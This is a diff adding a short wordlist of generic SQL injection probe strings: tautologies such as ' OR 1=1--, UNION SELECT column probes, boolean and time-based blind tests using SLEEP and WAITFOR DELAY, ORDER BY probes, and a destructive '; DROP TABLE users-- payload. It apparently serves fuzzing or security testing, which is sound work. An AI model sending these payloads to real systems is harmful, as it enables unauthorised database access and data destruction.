@@ -1,0 +1,28 @@
+'
+"
+1' OR '1'='1
+1" OR "1"="1
+1 OR 1=1
+1 OR 1=1--
+1' OR '1'='1'--
+1' OR '1'='1'/*
+' OR ''='
+" OR ""="
+' OR 1=1--
+" OR 1=1--
+admin'--
+1; SELECT 1--
+1'; DROP TABLE users--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+1' AND SLEEP(3)--
+1" AND SLEEP(3)--
+1; WAITFOR DELAY '0:0:3'--
+1' ORDER BY 1--
+1' ORDER BY 100--
